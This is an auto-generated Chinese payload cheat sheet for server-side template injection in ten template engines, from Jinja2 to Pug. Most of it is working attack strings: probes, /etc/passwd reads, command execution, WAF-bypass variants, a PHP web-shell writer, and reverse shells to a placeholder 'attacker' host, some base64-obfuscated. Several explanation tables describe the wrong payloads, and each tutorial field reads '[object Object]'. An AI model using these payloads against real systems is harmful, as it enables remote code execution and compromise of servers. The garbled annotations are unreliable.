# SSTI模板注入 — Web 攻击 payload

> 来源：src-hunter `references/payloader/raw/web.json`（10 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. Jinja2模板注入

- **id:** `ssti-jinja2`
- **分类:** SSTI模板注入 / Jinja2
- **tags:** `ssti` `jinja2` `twig` `template`

Jinja2/Twig模板注入攻击技术

**前置条件**

- 使用Jinja2/Twig模板引擎
- 用户输入直接渲染到模板

**利用步骤**

#### 1. 探测SSTI

```
{{7*7}}
${7*7}
<%= 7*7 %>
{{config}}
如果输出49或配置信息，则存在SSTI
```

探测模板注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `{{` | Jinja2变量输出语法 | value |
| `7*7` | 数学表达式 | value |
| `}}` | 变量输出结束 | value |

#### 2. 信息收集

```
{{config}}
{{self}}
{{request}}
{{"".__class__.__mro__}}
{{"".__class__.__mro__[1].__subclasses__()}}
```

收集环境信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `__class__` | 获取对象的类 | value |
| `__mro__` | 方法解析顺序 | value |
| `__subclasses__` | 获取子类列表 | value |

#### 3. 命令执行

```
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

执行系统命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `__init__` | 类的初始化方法 | value |
| `__globals__` | 全局命名空间 | value |
| `popen` | 打开管道执行命令 | value |

#### 4. 反弹Shell

```
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"').read()}}
```

获取反弹Shell

| 片段 | 说明 | 类型 |
|---|---|---|
| `{{}}` | 模板表达式语法 | technique |
| `__class__` | Python类属性 | keyword |
| `config` | 配置对象 | variable |

> platform: `linux`

**WAF 绕过**

#### 字符串拼接

```
{{''['__cla'+'ss__']}}
{{''|attr('__cla'+'ss__')}}
{{''|attr('\x5f\x5fcla\x5f\x5fss')}}
```

使用字符串拼接绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `attr()` | Jinja2过滤器获取属性 | function |
| `\x5f` | 下划线的十六进制编码 | value |

#### 使用request对象

```
{{request|attr(request.args.a)}}&a=__class__
{{request|attr(request.args.a)|attr(request.args.b)}}&a=__class__&b=__mro__
```

通过request参数传递

| 片段 | 说明 | 类型 |
|---|---|---|
| `{{}}` | 模板表达式语法 | technique |
| `__class__` | Python类属性 | keyword |

**教程**

[object Object]

---

### 2. FreeMarker模板注入

- **id:** `ssti-freemarker`
- **分类:** SSTI模板注入 / FreeMarker
- **tags:** `ssti` `freemarker` `java` `template`

FreeMarker模板引擎注入攻击技术

**前置条件**

- 使用FreeMarker模板引擎
- 用户输入直接渲染到模板

**利用步骤**

#### 1. 探测SSTI

```
${7*7}
${"freemarker"}
<#assign ex="freemarker">
如果输出49或freemarker，则存在SSTI
```

探测FreeMarker模板注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `${` | FreeMarker变量输出语法 | variable |
| `7*7` | 数学表达式 | value |
| `}` | 变量输出结束 | value |

#### 2. 信息收集

```
${.version}
${.current_template_name}
${.lang}
${system_property["java.version"]}
${system_property["os.name"]}
```

收集环境信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `.version` | FreeMarker版本 | value |
| `system_property` | Java系统属性 | value |

#### 3. 命令执行 - new

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
```

使用Execute类执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `?new()` | 实例化类 | function |
| `Execute` | FreeMarker内置命令执行类 | keyword |

#### 4. 命令执行 - api

```
<#assign api="freemarker.template.utility.ObjectConstructor"?new()>${api("java.lang.Runtime","getRuntime").exec("id")}
<#assign api="freemarker.template.utility.ObjectConstructor"?new()>${api("java.lang.ProcessBuilder","/bin/sh","-c","id").start()}
```

使用ObjectConstructor执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `<!ENTITY>` | 实体定义 | tag |
| `SYSTEM` | 外部实体 | keyword |
| `file://` | 文件协议 | technique |

#### 5. 反弹Shell

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}
```

获取反弹Shell

| 片段 | 说明 | 类型 |
|---|---|---|
| `<#assign` | 命令/载荷起始 | command |
| ` ex="freemarker.template.utility.Execute"?new()>${ex("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}` | 参数与载荷内容 | value |

> platform: `linux`

**WAF 绕过**

#### 字符串拼接

```
<#assign ex="freemarker.template.utility.Ex"+"ecute"?new()>${ex("id")}
<#assign cls="java.lang.Ru"+"ntime">${cls?new().exec("id")}
```

使用字符串拼接绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `Ex"+"ecute` | 字符串拼接绕过关键字检测 | value |

#### 使用内置函数

```
${"freemarker.template.utility.Execute"?new()("id")}
${"java.lang.Runtime"?new().exec("id")}
```

直接实例化执行

| 片段 | 说明 | 类型 |
|---|---|---|
| `EXEC` | 执行存储过程 | keyword |
| `Runtime.exec` | Java命令执行 | function |

**教程**

[object Object]

---

### 3. Velocity模板注入

- **id:** `ssti-velocity`
- **分类:** SSTI模板注入 / Velocity
- **tags:** `ssti` `velocity` `java` `template`

Velocity模板引擎注入攻击技术

**前置条件**

- 使用Velocity模板引擎
- 用户输入直接渲染到模板

**利用步骤**

#### 1. 探测SSTI

```
#set($x=7*7)$x
$velocityVersion
$class.inspect("java.lang.Runtime")
如果输出49或版本信息，则存在SSTI
```

探测Velocity模板注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `#set` | Velocity变量赋值指令 | value |
| `$x` | 变量引用 | variable |
| `$velocityVersion` | Velocity版本信息 | variable |

#### 2. 信息收集

```
$class.inspect("java.lang.System")
$class.inspect("java.lang.Runtime")
$sys.class.forName("java.lang.Runtime")
```

收集环境信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `$class.inspect` | 检查类信息 | variable |
| `java.lang.Runtime` | Java Runtime类 | value |

#### 3. 命令执行 - ClassTool

```
#set($rt=$class.inspect("java.lang.Runtime"))
#set($chr=$class.inspect("java.lang.Character"))
#set($ex=$rt.getRuntime().exec("id"))
$ex.waitFor()
#set($is=$ex.getInputStream())
#set($br=$class.inspect("java.io.BufferedReader").newInstance($class.inspect("java.io.InputStreamReader").newInstance($is)))
#set($line=$br.readLine())
$line
```

使用ClassTool执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `$class.inspect` | 获取类对象 | variable |
| `getRuntime()` | 获取Runtime实例 | function |
| `exec()` | 执行命令 | function |

#### 4. 命令执行 - 反射

```
#set($rt=$Class.forName("java.lang.Runtime"))
#set($m=$rt.getDeclaredMethod("getRuntime"))
#set($obj=$m.invoke(null))
#set($ex=$rt.getDeclaredMethod("exec",$Class.forName("java.lang.String")).invoke($obj,"id"))
```

使用反射执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `$Class.forName` | 加载类 | variable |
| `getDeclaredMethod` | 获取方法 | encoding |
| `invoke` | 调用方法 | value |

#### 5. 反弹Shell

```
#set($rt=$Class.forName("java.lang.Runtime"))
#set($m=$rt.getDeclaredMethod("getRuntime"))
#set($obj=$m.invoke(null))
#set($ex=$rt.getDeclaredMethod("exec",$Class.forName("java.lang.String")).invoke($obj,"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}"))
```

获取反弹Shell

| 片段 | 说明 | 类型 |
|---|---|---|
| `#set($rt=$Class.forName("java.lang.Runtime")) #set($m=$rt.getDeclaredMethod("getRuntime")) #set($obj=$m.invoke(null)) #set($ex=$rt.getDeclaredMethod("exec",$Class.forName("java.lang.String")).invoke($obj,"bash` | 命令/载荷起始 | command |
| ` -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}"))` | 参数与载荷内容 | value |

> platform: `linux`

**WAF 绕过**

#### 字符串拼接

```
#set($cmd="i"+"d")
#set($rt=$Class.forName("java.lang.Ru"+"ntime"))
#set($ex=$rt.getRuntime().exec($cmd))
```

使用字符串拼接绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `#set($cmd="i"+"d") #set($rt=$Class.forName("java.lang.Ru"+"ntime")) #set($ex=$` | 攻击载荷 | value |

#### 使用Unicode

```
#set($cmd="id")
#set($rt=$Class.forName("java.lang.Runtime"))
#set($ex=$rt.getRuntime().exec($cmd))
```

使用Unicode编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `\i\d` | id的Unicode编码 | value |

**教程**

[object Object]

---

### 4. Thymeleaf模板注入

- **id:** `ssti-thymeleaf`
- **分类:** SSTI模板注入 / Thymeleaf
- **tags:** `ssti` `thymeleaf` `java` `spring` `template`

Thymeleaf模板引擎注入攻击技术

**前置条件**

- 使用Thymeleaf模板引擎
- Spring框架
- 用户输入直接渲染到模板

**利用步骤**

#### 1. 探测SSTI

```
${7*7}
#{7*7}
*{7*7}
[[${7*7}]]
如果输出49，则存在SSTI
```

探测Thymeleaf模板注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `$7*7` | 命令/关键字 | command |

#### 2. 信息收集

```
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec("id")}
${T(java.lang.Class).forName("java.lang.Runtime")}
```

收集环境信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `T()` | 访问Java类 | function |
| `getenv()` | 获取环境变量 | function |

#### 3. 命令执行 - Spring表达式

```
${T(java.lang.Runtime).getRuntime().exec("id")}
${T(java.lang.Runtime).getRuntime().exec("whoami")}
${T(java.lang.ProcessBuilder).newInstance("id").start()}
```

使用Spring表达式执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `T(java.lang.Runtime)` | 访问Runtime类 | value |
| `getRuntime()` | 获取Runtime实例 | function |
| `exec()` | 执行命令 | function |

#### 4. 命令执行 - ProcessBuilder

```
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
${new java.lang.ProcessBuilder(new String[]{"bash","-c","id"}).start()}
${new java.lang.ProcessBuilder(new String[]{"cmd","/c","whoami"}).start()}
```

使用ProcessBuilder执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `new` | 实例化对象 | value |
| `ProcessBuilder` | Java进程构建器 | value |
| `start()` | 启动进程 | function |

#### 5. 反弹Shell

```
${T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}
```

获取反弹Shell

| 片段 | 说明 | 类型 |
|---|---|---|
| `EXEC` | 执行存储过程 | keyword |
| `base64` | Base64编码 | encoding |
| `Runtime.exec` | Java命令执行 | function |

> platform: `linux`

**WAF 绕过**

#### 字符串拼接

```
${T(java.lang.Run"+"time).getRuntime().exec("i"+"d")}
${T(java.lang.Class).forName("java.lang.Ru"+"ntime").getMethod("getRuntime").invoke(null)}
```

使用字符串拼接绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `EXEC` | 执行存储过程 | keyword |
| `Runtime.exec` | Java命令执行 | function |

#### 使用反射

```
${T(Class).forName("java.lang.Runtime").getMethod("exec",T(String)).invoke(T(Runtime).getRuntime(),"id")}
```

使用反射绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `EXEC` | 执行存储过程 | keyword |
| `Runtime.exec` | Java命令执行 | function |

#### URL编码

```
${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{105,100}))}
# 使用字节数组构造命令
```

使用字节数组绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `new byte[]{105,100}` | id的ASCII字节 | value |

**教程**

[object Object]

---

### 5. Smarty模板注入

- **id:** `ssti-smarty`
- **分类:** SSTI模板注入 / Smarty
- **tags:** `ssti` `smarty` `php` `template`

Smarty模板引擎注入攻击技术

**前置条件**

- 使用Smarty模板引擎
- 用户输入直接渲染到模板

**利用步骤**

#### 1. 探测SSTI

```
{$smarty.version}
{7*7}
{$smarty.template}
如果输出版本或49，则存在SSTI
```

探测Smarty模板注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `$smarty.version` | 命令/关键字 | command |

#### 2. 信息收集

```
{$smarty.server.PHP_SELF}
{$smarty.server.SERVER_NAME}
{$smarty.const.PHP_VERSION}
```

收集环境信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `$smarty.server` | 服务器变量 | variable |
| `$smarty.const` | PHP常量 | variable |

#### 3. 命令执行 - system

```
{system("id")}
{system("whoami")}
{system("cat /etc/passwd")}
```

使用system函数执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | PHP系统命令执行函数 | function |

#### 4. 命令执行 - passthru

```
{passthru("id")}
{passthru("ls -la")}
{passthru("cat /etc/passwd")}
```

使用passthru函数执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `passthru()` | PHP命令执行函数 | function |

#### 5. 命令执行 - exec

```
{exec("id",$output)}
{foreach from=$output item=line}{$line}{/foreach}
```

使用exec函数执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `exec()` | PHP命令执行函数 | function |
| `$output` | 输出数组 | variable |

#### 6. 反弹Shell

```
{system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"")}
{system("nc -e /bin/sh attacker 4444")}
```

获取反弹Shell

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 系统命令执行 | function |

> platform: `linux`

**WAF 绕过**

#### 字符串拼接

```
{system("i"+"d")}
{system("who"."ami")}
{system("ca"."t /etc/passwd")}
```

使用字符串拼接绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `{system("i"+"d")} {system("who"."ami")} {system("ca"."t` | 命令/载荷起始 | command |
| ` /etc/passwd")}` | 参数与载荷内容 | value |

#### 变量赋值

```
{assign var="cmd" value="id"}
{system($cmd)}
{assign var="f" value="sys"."tem"}
{$f("id")}
```

使用变量赋值绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `assign` | Smarty变量赋值 | value |
| `value` | 变量值 | value |

#### 使用PHP函数

```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{PHP function call}
```

WAF绕过技术

| 片段 | 说明 | 类型 |
|---|---|---|
| `Smarty_Internal_Write_File::writeFile$SCRIPT_NAME<?php` | 命令/关键字 | command |

**教程**

[object Object]

---

### 6. Mako模板注入

- **id:** `ssti-mako`
- **分类:** SSTI模板注入 / Mako
- **tags:** `ssti` `mako` `python` `template`

Mako模板引擎注入攻击技术

**前置条件**

- 使用Mako模板引擎
- 用户输入直接渲染到模板

**利用步骤**

#### 1. 探测SSTI

```
${7*7}
${self}
${self.module}
如果输出49或模块信息，则存在SSTI
```

探测Mako模板注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `$7*7` | 命令/关键字 | command |

#### 2. 信息收集

```
${self.module.cache.util}
${self.module.cache.util.os}
${dir(self)}
```

收集环境信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `self.module` | 访问模板模块 | value |
| `dir()` | 列出对象属性 | function |

#### 3. 命令执行 - os模块

```
${self.module.cache.util.os.popen("id").read()}
${self.module.cache.util.os.popen("whoami").read()}
${self.module.cache.util.os.system("id")}
```

使用os模块执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `os.popen()` | 打开管道执行命令 | function |
| `.read()` | 读取输出 | function |

#### 4. 命令执行 - subprocess

```
<%
import subprocess
%>
${subprocess.check_output(["id","-a"])}
${subprocess.Popen(["id"],stdout=subprocess.PIPE).communicate()[0]}
```

使用subprocess执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `<%` | Mako Python代码块开始 | operator |
| `%>` | 代码块结束 | operator |
| `subprocess` | Python子进程模块 | value |

#### 5. 反弹Shell

```
${self.module.cache.util.os.popen("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"").read()}
```

获取反弹Shell

| 片段 | 说明 | 类型 |
|---|---|---|
| `$self.module.cache.util.os.popenbash` | 命令/关键字 | command |

> platform: `linux`

**WAF 绕过**

#### 字符串拼接

```
${self.module.cache.util.os.popen("i"+"d").read()}
${self.module.cache.util.os.popen("who"+"ami").read()}
```

使用字符串拼接绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `$self.module.cache.util.os.popeni+d.read` | 命令/关键字 | command |

#### 使用__import__

```
${__import__("os").popen("id").read()}
${__import__("subprocess").check_output(["id"])}
```

使用__import__导入模块

| 片段 | 说明 | 类型 |
|---|---|---|
| `__import__` | Python内置导入函数 | value |

#### 使用getattr

```
${getattr(__import__("os"),"popen")("id").read()}
${getattr(getattr(__import__("os"),"popen")("id"),"read")()}
```

使用getattr绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `$getattr__import__ospopenid.read` | 命令/关键字 | command |

**教程**

[object Object]

---

### 7. Tornado模板注入

- **id:** `ssti-tornado`
- **分类:** SSTI模板注入 / Tornado
- **tags:** `ssti` `tornado` `python` `template`

Tornado模板引擎注入攻击技术

**前置条件**

- 使用Tornado模板引擎
- 用户输入直接渲染到模板

**利用步骤**

#### 1. 探测SSTI

```
{{7*7}}
{{handler}}
{{request}}
如果输出49或handler对象，则存在SSTI
```

探测Tornado模板注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `{{...}}` | 模板表达式 | format |

#### 2. 信息收集

```
{{handler.settings}}
{{handler.application}}
{{request.headers}}
{{request.cookies}}
```

收集环境信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `handler.settings` | 应用配置 | value |
| `request.headers` | HTTP头 | value |

#### 3. 命令执行 - os

```
{% import os %}
{{os.popen("id").read()}}
{{os.popen("whoami").read()}}
{{os.system("id")}}
```

使用os模块执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 系统命令执行 | function |
| `{{...}}` | 模板表达式 | format |

#### 4. 命令执行 - subprocess

```
{% import subprocess %}
{{subprocess.check_output(["id","-a"])}}
{{subprocess.Popen(["id"],stdout=-1).communicate()[0]}}
```

使用subprocess执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `subprocess` | Python子进程模块 | value |
| `check_output` | 获取命令输出 | value |

#### 5. 反弹Shell

```
{% import os %}
{{os.popen("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"").read()}}
```

获取反弹Shell

| 片段 | 说明 | 类型 |
|---|---|---|
| `{{...}}` | 模板表达式 | format |

> platform: `linux`

**WAF 绕过**

#### 字符串拼接

```
{% import os %}
{{os.popen("i"+"d").read()}}
{{os.popen("who"+"ami").read()}}
```

使用字符串拼接绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `{{...}}` | 模板表达式 | format |

#### 使用__import__

```
{{__import__("os").popen("id").read()}}
{{__import__("subprocess").check_output(["id"])}}
```

使用__import__导入模块

| 片段 | 说明 | 类型 |
|---|---|---|
| `{{...}}` | 模板表达式 | format |

#### 使用handler

```
{{handler.application.settings}}
{{handler.get_status()}}
{{handler.request.remote_ip}}
```

通过handler访问

| 片段 | 说明 | 类型 |
|---|---|---|
| `{{handler.application.settings}} {{handler.get_status()}} ` | 模板表达式注入 | value |

**教程**

[object Object]

---

### 8. Django模板注入

- **id:** `ssti-django`
- **分类:** SSTI模板注入 / Django
- **tags:** `ssti` `django` `python` `template`

Django模板引擎注入攻击技术

**前置条件**

- 使用Django模板引擎
- 用户输入直接渲染到模板

**利用步骤**

#### 1. 探测SSTI

```
{{7*7}}
{% if 1=1 %}vulnerable{% endif %}
{{request}}
如果输出49或request对象，则存在SSTI
```

探测Django模板注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `{{...}}` | 模板表达式 | format |

#### 2. 信息收集

```
{{request.META}}
{{request.user}}
{{request.session}}
{{settings.SECRET_KEY}}
```

收集环境信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `request.META` | HTTP元数据 | value |
| `request.user` | 当前用户 | value |
| `settings` | Django配置 | value |

#### 3. 命令执行 - 通过settings

```
{{settings.TEMPLATES}}
{{settings.DATABASES}}
# Django模板默认沙箱，难以直接执行命令
# 需要找到可利用的对象链
```

尝试通过settings访问

| 片段 | 说明 | 类型 |
|---|---|---|
| `{{...}}` | 模板表达式 | format |

#### 4. 命令执行 - 对象链

```
{{request.user.groups.model._meta.apps}}
{{request.user.user_permissions.model._meta.apps}}
# 尝试访问Django内部对象
```

通过对象链访问

| 片段 | 说明 | 类型 |
|---|---|---|
| `_meta` | Django模型元数据 | value |
| `apps` | 应用注册表 | value |

#### 5. 敏感信息泄露

```
{{settings.SECRET_KEY}}
{{settings.DATABASES}}
{{settings.ALLOWED_HOSTS}}
{{settings.DEBUG}}
```

泄露敏感配置

| 片段 | 说明 | 类型 |
|---|---|---|
| `{{}}` | 模板表达式 | technique |
| `os` | 系统模块 | keyword |

**WAF 绕过**

#### 使用过滤器

```
{{request|length}}
{{settings.SECRET_KEY|default:""}}
{{request.META|dictsort:"key"}}
```

使用Django过滤器

| 片段 | 说明 | 类型 |
|---|---|---|
| `|length` | 长度过滤器 | value |
| `|default` | 默认值过滤器 | value |

#### 使用for循环

```
{% for key, value in request.META.items %}{{key}}:{{value}}{% endfor %}
{% for k in settings.keys %}{{k}}{% endfor %}
```

使用for循环遍历

| 片段 | 说明 | 类型 |
|---|---|---|
| `{{...}}` | 模板表达式 | format |

**教程**

[object Object]

---

### 9. ERB模板注入

- **id:** `ssti-erb`
- **分类:** SSTI模板注入 / ERB
- **tags:** `ssti` `erb` `ruby` `template`

ERB(Ruby)模板引擎注入攻击技术

**前置条件**

- 使用ERB模板引擎
- 用户输入直接渲染到模板

**利用步骤**

#### 1. 探测SSTI

```
<%= 7*7 %>
<%= self %>
<%= __FILE__ %>
如果输出49或文件信息，则存在SSTI
```

探测ERB模板注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `<%=` | ERB输出表达式 | operator |
| `7*7` | 数学表达式 | value |
| `%>` | 表达式结束 | operator |

#### 2. 信息收集

```
<%= Dir.pwd %>
<%= ENV.inspect %>
<%= `id` %>
<%= File.read("/etc/passwd") %>
```

收集环境信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `Dir.pwd` | 当前目录 | value |
| `ENV` | 环境变量 | value |
| ``id`` | 反引号执行命令 | value |

#### 3. 命令执行 - 反引号

```
<%= `id` %>
<%= `whoami` %>
<%= `cat /etc/passwd` %>
<%= `ls -la` %>
```

使用反引号执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| ``` | Ruby反引号执行系统命令 | value |

#### 4. 命令执行 - system

```
<%= system("id") %>
<%= system("whoami") %>
<%= exec("id") %>
<%= IO.popen("id").read %>
```

使用system/exec执行命令并获取反弹Shell

| 片段 | 说明 | 类型 |
|---|---|---|
| `EXEC` | 执行存储过程 | keyword |
| `system()` | 系统命令执行 | function |

> platform: `linux`

**WAF 绕过**

#### 字符串拼接

```
<%= `i` + `d` %>
<%= system("wh"+"oami") %>
<%= ("i"+"d").then { |c| system(c) } %>
```

使用字符串拼接绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `<%= `i` + `d` %> <%= system("wh"+"oami") %> <%= ("i"+"d").` | 模板表达式注入 | value |

#### 使用%语法

```
<%= %x(id) %>
<%= %x{whoami} %>
<%= %x[cat /etc/passwd] %>
```

使用%x语法执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `%x()` | Ruby命令执行语法 | function |

#### 使用Open3

```
<%= require "open3"; Open3.popen3("id") { |i,o,e,t| puts o.read } %>
```

使用Open3模块

| 片段 | 说明 | 类型 |
|---|---|---|
| `<%=` | 命令/关键字 | command |

**教程**

[object Object]

---

### 10. Pug/Jade模板注入

- **id:** `ssti-pug`
- **分类:** SSTI模板注入 / Pug
- **tags:** `ssti` `pug` `jade` `nodejs` `template`

Pug/Jade模板引擎注入攻击技术

**前置条件**

- 使用Pug/Jade模板引擎
- 用户输入直接渲染到模板

**利用步骤**

#### 1. 探测SSTI

```
#{7*7}
#{this}
#{global}
如果输出49或global对象，则存在SSTI
```

探测Pug模板注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `#{` | Pug插值语法 | value |
| `7*7` | 数学表达式 | value |
| `}` | 插值结束 | value |

#### 2. 信息收集

```
#{process}
#{process.env}
#{global.process}
#{require}
```

收集环境信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `process` | Node.js进程对象 | value |
| `process.env` | 环境变量 | path |
| `global` | 全局对象 | value |

#### 3. 命令执行 - child_process

```
- var exec = require("child_process").exec
#{exec("id", function(err, stdout, stderr) { console.log(stdout) })}
- require("child_process").exec("id")
```

使用child_process执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `-` | Pug JavaScript代码行 | operator |
| `require` | Node.js模块加载 | value |
| `child_process` | 子进程模块 | value |

#### 4. 命令执行 - execSync

```
- var execSync = require("child_process").execSync
#{execSync("id").toString()}
#{require("child_process").execSync("id").toString()}
```

使用execSync执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `execSync` | 同步执行命令 | value |
| `toString()` | Buffer转字符串 | function |

#### 5. 反弹Shell

```
- require("child_process").exec("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"")
```

获取反弹Shell

| 片段 | 说明 | 类型 |
|---|---|---|
| `EXEC` | 执行存储过程 | keyword |

> platform: `linux`

**WAF 绕过**

#### 字符串拼接

```
- var cmd = "i" + "d"
#{require("child_process").execSync(cmd).toString()}
- var r = "require"
#{global[r]("child_process")}
```

使用字符串拼接绕过

#### 使用global

```
#{global.process.mainModule.require("child_process").execSync("id").toString()}
#{global["req"+"uire"]("child_process")}
```

使用global对象

| 片段 | 说明 | 类型 |
|---|---|---|
| `mainModule` | Node.js主模块 | value |
| `require` | 模块加载函数 | value |

#### 使用this

```
#{this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id")}
```

使用this.constructor

| 片段 | 说明 | 类型 |
|---|---|---|
| `#this.constructor.constructorreturn` | 命令/关键字 | command |

**教程**

[object Object]
